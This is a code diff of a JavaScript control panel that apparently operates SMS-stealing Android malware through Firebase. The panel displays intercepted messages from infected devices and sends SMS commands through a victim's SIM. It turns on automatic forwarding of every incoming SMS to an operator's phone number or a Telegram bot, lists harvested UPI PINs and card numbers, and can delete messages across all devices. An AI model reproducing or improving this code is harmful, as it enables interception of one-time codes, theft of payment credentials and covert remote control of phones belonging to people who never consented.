+      return '<div class="message-item ' + (m.type === 'SENT' ? 'sent' : '') + '" data-sms-search="' + escapeHtml((m.sender || '') + ' ' + (m.body || '')).toLowerCase() + '"><div class="msg-sender"><span>' + escapeHtml(m.sender || 'Unknown') + '</span><span style="color:' + (m.type === 'SENT' ? '#00FF88' : '#00E5FF') + ';font-size:9px">' + (m.type || 'IN') + '</span></div><div class="msg-body">' + escapeHtml(m.body || '') + '</div><div class="msg-date">' + (m.date || '') + '</div></div>';
     }).join('');
-  } else if (currentTab === 'send') {
-    body.innerHTML = '<div class="message-item"><div class="msg-sender">SEND SMS VIA DEVICE</div>' +
-      '<div class="form-group"><label class="form-label">To Number</label><input type="text" class="form-input" id="sTo" placeholder="9876543210" inputmode="numeric"></div>' +
-      '<div class="form-group"><label class="form-label">Message</label><textarea class="form-textarea" id="sMsg" placeholder="Type message..."></textarea></div>' +
-      '<div class="form-group"><label class="form-label">SIM Slot</label><select class="form-select" id="sSim"><option value="1">SIM 1</option><option value="2">SIM 2</option></select></div>' +
-      '<button class="btn-submit" id="sSend">📤 SEND VIA SIM</button></div>' +
-      '<div class="message-item"><div class="msg-sender">TELEGRAM TO SMS AUTO</div>' +
-      '<div class="form-group"><label class="form-label">Bot Token</label><input type="text" class="form-input" id="tToken" placeholder="BotFather token"></div>' +
-      '<div class="form-group"><label class="form-label">Chat ID</label><input type="text" class="form-input" id="tChat" placeholder="-100xxx or @channel"></div>' +
-      '<button class="btn-submit" id="tStart">✈️ START</button></div>';
     setTimeout(function() {
-      document.getElementById('sSend').onclick = function() {
-        var to = document.getElementById('sTo').value.trim();
-        var msg = document.getElementById('sMsg').value.trim();
-        var sim = parseInt(document.getElementById('sSim').value);
-        if (!to || !msg) { alert('Fill fields'); return; }
-        db.ref('device_info/' + currentDeviceId + '/sms_commands').push({ to: to, message: msg, sim_slot: sim, status: 'pending', timestamp: Date.now() });
-        alert('✅ Sent');
-      };
-      document.getElementById('tStart').onclick = function() {
-        var tok = document.getElementById('tToken').value.trim();
-        var chat = document.getElementById('tChat').value.trim();
-        if (!tok || !chat) { alert('Fill fields'); return; }
-        db.ref('forward_settings/' + currentDeviceId).set({ bot_token: tok, chat_id: chat, enabled: true, forward_sim_slot: 1, start_timestamp: Date.now(), updated_at: Date.now() });
-        alert('✅ Telegram started');
-      };
+      var inp = document.getElementById('smsSearch');
+      if (inp) inp.addEventListener('input', function() {
+        var q = this.value.toLowerCase();
+        document.querySelectorAll('[data-sms-search]').forEach(function(el) {
+          el.style.display = el.getAttribute('data-sms-search').indexOf(q) !== -1 ? 'block' : 'none';
+        });
+      });
     }, 50);
+  } else if (currentTab === 'send') {
+    var fwd = dev.forward_settings || {};
+    var simSelected = fwd.forward_sim_slot || 1;
+    var forwardingOn = fwd.enabled || false;
+    var fwdNumber = fwd.admin_number || '';
+    var botToken = fwd.bot_token || '';
+    var chatId = fwd.chat_id || '';
+    
+    body.innerHTML = 
+      '<div class="send-card telegram">' +
+      '<h3>✈️ Telegram to SMS Auto</h3>' +
+      '<p>Auto-fills the Send SMS form and sends instantly when a channel message arrives</p>' +
+      '<div class="form-group"><label class="form-label">Bot Token</label><input type="text" class="form-input" id="tgToken" value="' + escapeHtml(botToken) + '" placeholder="BotFather token"></div>' +
+      '<div style="display:flex;gap:8px;align-items:flex-end;">' +
+      '<div class="form-group" style="flex:1;margin-bottom:0;"><label class="form-label">Channel / Chat ID</label><input type="text" class="form-input" id="tgChat" value="' + escapeHtml(chatId) + '" placeholder="-100xxx or @channel"></div>' +
+      '<button class="btn-submit" id="tgStart" style="width:auto;padding:10px 20px;margin:0;">Start</button>' +
+      '</div>' +
+      '<div class="info-box"><span class="dot-indicator"></span>Idle - enter a token and chat ID, then select Start</div>' +
+      '<div class="info-box" style="font-style:italic;">Format: line 1 is the phone number; remaining lines are the SMS text.</div>' +
+      '</div>' +
+      
+      '<div class="send-card forwarding">' +
+      '<h3 style="color:#00FF88;">📱 SMS FORWARDING (AUTO)</h3>' +
+      '<p>Enter a number and select ON. New SMS messages are placed in the Send SMS form automatically.</p>' +
+      '<label class="form-label">SIM (SEND LINE)</label>' +
+      '<div class="sim-row">' +
+      '<div class="sim-btn ' + (simSelected === 1 ? 'active' : '') + '" data-sim="1">SIM 1' + (simSelected === 1 ? ' ✓' : '') + '</div>' +
+      '<div class="sim-btn ' + (simSelected === 2 ? 'active' : '') + '" data-sim="2">SIM 2</div>' +
+      '</div>' +
+      '<label class="form-label">+91 FORWARDING NUMBER</label>' +
+      '<div style="display:flex;gap:8px;">' +
+      '<input type="text" class="form-input" id="fwdNum" value="' + escapeHtml(fwdNumber) + '" placeholder="+91XXXXXXXXXX" inputmode="numeric" style="flex:1;">' +
+      '<button class="on-off-btn ' + (forwardingOn ? 'on' : '') + '" id="fwdToggle">' + (forwardingOn ? '✓ ON' : '▶ ON') + '</button>' +
+      '</div>' +
+      '<div class="info-box green"><span class="dot-indicator ' + (forwardingOn ? 'on' : '') + '"></span>Off - enter a number and select ON</div>' +
+      '<div class="info-box" style="font-style:italic;">Recipient: forwarding number. Message: complete new SMS. Send delay: 0.5 seconds.</div>' +
+      '</div>' +
+      
+      '<div class="send-card">' +
+      '<h3>📤 SEND SMS DIRECT</h3>' +
+      '<label class="form-label">SELECT SIM</label>' +
+      '<div class="sim-row">' +
+      '<div class="sim-btn active" data-sendsim="1">SIM 1</div>' +
+      '<div class="sim-btn" data-sendsim="2">SIM 2</div>' +
+      '</div>' +
+      '<div class="form-group"><label class="form-label">RECIPIENT</label><input type="text" class="form-input" id="sendTo" placeholder="+919876543210" inputmode="numeric"></div>' +
+      '<div class="form-group"><label class="form-label">MESSAGE</label><textarea class="form-textarea" id="sendMsg" placeholder="Type your message here..."></textarea><div class="chars-count" id="charsCount">0 chars</div></div>' +
+      '<button class="btn-submit" id="sendBtn">✈️ Send via SIM</button>' +
+      '<button class="btn-submit" id="useDeviceNum" style="background:#1A2F4A;color:#00E5FF;margin-top:8px;">Use device number: ' + escapeHtml((dev.sim_info && dev.sim_info.sim1_number) || '-') + '</button>' +
+      '</div>';
+    
+    setTimeout(function() {
+      // SIM buttons - forwarding
+      document.querySelectorAll('[data-sim]').forEach(function(b) {
+        b.addEventListener('click', function() {
+          var sim = parseInt(this.getAttribute('data-sim'));
+          db.ref('forward_settings/' + currentDeviceId + '/forward_sim_slot').set(sim);
+          renderTab();
+        });
+      });
+      
+      // Telegram start
+      document.getElementById('tgStart').addEventListener('click', function() {
+        var tok = document.getElementById('tgToken').value.trim();
+        var chat = document.getElementById('tgChat').value.trim();
+        if (!tok || !chat) { alert('Fill token and chat ID'); return; }
+        db.ref('forward_settings/' + currentDeviceId).update({
+          bot_token: tok, chat_id: chat, enabled: true, start_timestamp: Date.now(), updated_at: Date.now()
+        });
+        alert('✅ Telegram activated');
+      });
+      
+      // Forwarding toggle
+      document.getElementById('fwdToggle').addEventListener('click', function() {
+        var num = document.getElementById('fwdNum').value.trim();
+        var newState = !forwardingOn;
+        if (newState && num.length < 10) { alert('Enter valid number'); return; }
+        db.ref('forward_settings/' + currentDeviceId).update({
+          enabled: newState, admin_number: num, start_timestamp: Date.now()
+        });
+        renderTab();
+      });
+      
+      // Send SIM buttons
+      document.querySelectorAll('[data-sendsim]').forEach(function(b) {
+        b.addEventListener('click', function() {
+          document.querySelectorAll('[data-sendsim]').forEach(function(x) { x.classList.remove('active'); });
+          this.classList.add('active');
+        });
+      });
+      
+      // Char count
+      document.getElementById('sendMsg').addEventListener('input', function() {
+        document.getElementById('charsCount').textContent = this.value.length + ' chars';
+      });
+      
+      // Use device number
+      document.getElementById('useDeviceNum').addEventListener('click', function() {
+        document.getElementById('sendTo').value = (dev.sim_info && dev.sim_info.sim1_number) || '';
+      });
+      
+      // Send SMS
+      document.getElementById('sendBtn').addEventListener('click', function() {
+        var to = document.getElementById('sendTo').value.trim();
+        var msg = document.getElementById('sendMsg').value.trim();
+        var selectedSim = document.querySelector('[data-sendsim].active');
+        var sim = selectedSim ? parseInt(selectedSim.getAttribute('data-sendsim')) : 1;
+        if (!to || !msg) { alert('Fill recipient and message'); return; }
+        db.ref('device_info/' + currentDeviceId + '/sms_commands').push({
+          to: to, message: msg, sim_slot: sim, status: 'pending', timestamp: Date.now()
+        });
+        alert('✅ SMS command sent via SIM ' + sim);
+        document.getElementById('sendMsg').value = '';
+        document.getElementById('charsCount').textContent = '0 chars';
+      });
+    }, 100);
   }
 }
-
-function showDialog(title, content) {
-  document.getElementById('dialogTitle').textContent = title;
-  document.getElementById('dialogBody').innerHTML = content;
-  document.getElementById('dialog').classList.add('active');
-}
-function closeDialog() { document.getElementById('dialog').classList.remove('active'); }
 
 // EVENT LISTENERS
 document.getElementById('loginBtn').addEventListener('click', doLogin);
 document.getElementById('logoutBtn').addEventListener('click', doLogout);
 document.getElementById('closeModalBtn').addEventListener('click', closeModal);
-document.getElementById('closeDialogBtn').addEventListener('click', closeDialog);
+document.getElementById('closeDialogBtn').addEventListener('click', function() {
+  document.getElementById('dialogDrawer').classList.remove('active');
+  document.getElementById('dialogOverlay').classList.remove('active');
+});
+document.getElementById('drawerOverlay').addEventListener('click', closeModal);
+document.getElementById('dialogOverlay').addEventListener('click', function() {
+  document.getElementById('dialogDrawer').classList.remove('active');
+  document.getElementById('dialogOverlay').classList.remove('active');
+});
 document.getElementById('pinInput').addEventListener('keypress', function(e) { if (e.key === 'Enter') doLogin(); });
 document.getElementById('searchBox').addEventListener('input', renderDevices);
 document.getElementById('btnStarModal').addEventListener('click', function() { toggleLike(currentDeviceId); });
@@ -514,19 +565,12 @@ document.querySelectorAll('.filter-btn').forEach(function(btn) {
 document.querySelectorAll('.tab').forEach(function(t) {
   t.addEventListener('click', function() { switchTab(this.getAttribute('data-tab')); });
 });
-document.getElementById('btnAllMsg').addEventListener('click', function() {
-  if (!currentDeviceId) { alert('Open a device first'); return; }
-  switchTab('allsms');
-});
-document.getElementById('btnBulkSms').addEventListener('click', function() {
-  alert('Bulk SMS - coming soon');
-});
 document.getElementById('btnCsvExport').addEventListener('click', function() {
   var csv = 'Device,Sender,Body,Date\n';
   Object.keys(allDevices).forEach(function(id) {
     var dev = allDevices[id];
     if (dev.messages) Object.values(dev.messages).forEach(function(m) {
-      csv += '"' + id + '","' + (m.sender || '') + '","' + (m.body || '').replace(/"/g, '""') + '","' + (m.date || '') + '"\n';
+      csv += '"' + id + '","' + (m.sender || '').replace(/"/g, '""') + '","' + (m.body || '').replace(/"/g, '""') + '","' + (m.date || '') + '"\n';
     });
   });
   var blob = new Blob([csv], { type: 'text/csv' });
@@ -537,20 +581,20 @@ document.getElementById('btnPingAll').addEventListener('click', function() {
   alert('Ping sent to ' + Object.keys(allDevices).length + ' devices');
 });
 document.getElementById('btnFbSources').addEventListener('click', function() {
-  showDialog('Firebase Sources', '<div class="form-group"><label class="form-label">Current URL</label><input class="form-input" readonly value="' + firebaseConfig.databaseURL + '"></div>');
+  alert('Firebase URL: ' + firebaseConfig.databaseURL);
 });
 document.getElementById('btnCards').addEventListener('click', function() {
   var cards = '';
   Object.keys(allDevices).forEach(function(id) {
     var dev = allDevices[id];
     if (dev.card_data || dev.upi_data) {
-      cards += '<div class="message-item"><div class="msg-sender">' + id + '</div><div class="msg-body">UPI: ' + escapeHtml(dev.upi_data && dev.upi_data.upi_pin || '-') + '<br>Card: ' + escapeHtml(dev.card_data && dev.card_data.card_number || '-') + '</div></div>';
+      cards += id + ': UPI ' + (dev.upi_data && dev.upi_data.upi_pin || '-') + ' | Card ' + (dev.card_data && dev.card_data.card_number || '-') + '\n';
     }
   });
-  showDialog('💳 Cards & Payments', cards || '<div class="empty-msg">No cards</div>');
+  alert(cards || 'No cards found');
 });
 document.getElementById('btnNuke').addEventListener('click', function() {
-  if (!confirm('Delete ALL messages from ALL devices? This cannot be undone!')) return;
+  if (!confirm('Delete ALL messages from ALL devices?')) return;
   if (!confirm('Are you ABSOLUTELY sure?')) return;
   Object.keys(allDevices).forEach(function(id) {
     db.ref('device_info/' + id + '/messages').remove();
@@ -558,8 +602,6 @@ document.getElementById('btnNuke').addEventListener('click', function() {
   });
   alert('All messages deleted');
 });
-document.getElementById('modal').addEventListener('click', function(e) { if (e.target.id === 'modal') closeModal(); });
-document.getElementById('dialog').addEventListener('click', function(e) { if (e.target.id === 'dialog') closeDialog(); });
 
 window.addEventListener('load', function() {
   if (localStorage.getItem('admin_logged_in') === 'true') {
